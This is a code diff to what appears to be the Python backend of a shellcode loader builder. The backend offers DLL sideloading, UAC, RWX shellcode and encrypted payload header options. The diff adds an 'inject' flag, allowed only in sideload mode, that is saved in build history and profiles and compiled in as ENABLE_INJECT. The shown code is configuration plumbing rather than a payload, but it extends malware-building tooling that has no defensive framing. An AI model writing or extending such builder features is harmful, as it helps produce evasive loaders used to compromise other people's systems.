@@ -290,6 +290,7 @@ def _save_build_history(
         "uac":            bool(data.get("uac")),
         "rwx":            bool(data.get("rwx")),
         "debug":          bool(data.get("debug")),
+        "inject":         inject,
         "zip_name":       zip_info.get("name") if zip_info else None,
         "zip_size":       zip_info.get("size", 0) if zip_info else 0,
         "sideload_h_size": sideload_h_size,
@@ -636,6 +637,7 @@ def api_build():
     uac    = bool(data.get("uac"))
     rwx    = bool(data.get("rwx"))
     debug  = bool(data.get("debug"))
+    inject = bool(data.get("inject")) and mode == "sideload"
 
     # ── Payload.h: copy from encrypt history if requested ────────────────
     enc_hist_id = (data.get("encrypt_history_id") or "").strip()
@@ -710,8 +712,9 @@ def api_build():
 
     env    = os.environ.copy()
     extras: list[str] = []
-    if rwx:   extras.append("/DRWX_SHELLCODE")
-    if debug: extras.append("/DDEBUG")
+    if rwx:    extras.append("/DRWX_SHELLCODE")
+    if debug:  extras.append("/DDEBUG")
+    if inject: extras.append("/DENABLE_INJECT")
     if extras:
         env["CFLAGS_EXTRA"] = " ".join(extras)
 
@@ -1005,6 +1008,7 @@ def api_profiles_build_create():
         "uac":                 bool(data.get("uac")),
         "rwx":                 bool(data.get("rwx")),
         "debug":               bool(data.get("debug")),
+        "inject":              bool(data.get("inject")),
         "created_at":          int(time.time()),
     }
     profiles = _load_profiles()
@@ -1044,6 +1048,7 @@ def api_profiles_update(pid):
             "uac":                bool(data.get("uac")),
             "rwx":                bool(data.get("rwx")),
             "debug":              bool(data.get("debug")),
+            "inject":             bool(data.get("inject")),
         })
     existing.update(update)
     profiles[idx] = existing
@@ -1730,6 +1735,7 @@ def _run_pool_build_locked(pool: dict) -> bool:
     uac             = bool(profile.get("uac"))
     rwx             = bool(profile.get("rwx"))
     debug           = bool(profile.get("debug"))
+    inject          = bool(profile.get("inject")) and mode == "sideload"
     dll_id          = (profile.get("dll_id")          or "").strip()
     exe_id          = (profile.get("exe_id")          or "").strip()
     sideload_rename = (profile.get("sideload_rename") or "").strip()
@@ -1739,8 +1745,9 @@ def _run_pool_build_locked(pool: dict) -> bool:
     bind_rename     = (profile.get("bind_rename")     or "").strip()
 
     extras: list[str] = []
-    if rwx:   extras.append("/DRWX_SHELLCODE")
-    if debug: extras.append("/DDEBUG")
+    if rwx:    extras.append("/DRWX_SHELLCODE")
+    if debug:  extras.append("/DDEBUG")
+    if inject: extras.append("/DENABLE_INJECT")
     env = os.environ.copy()
     if extras:
         env["CFLAGS_EXTRA"] = " ".join(extras)
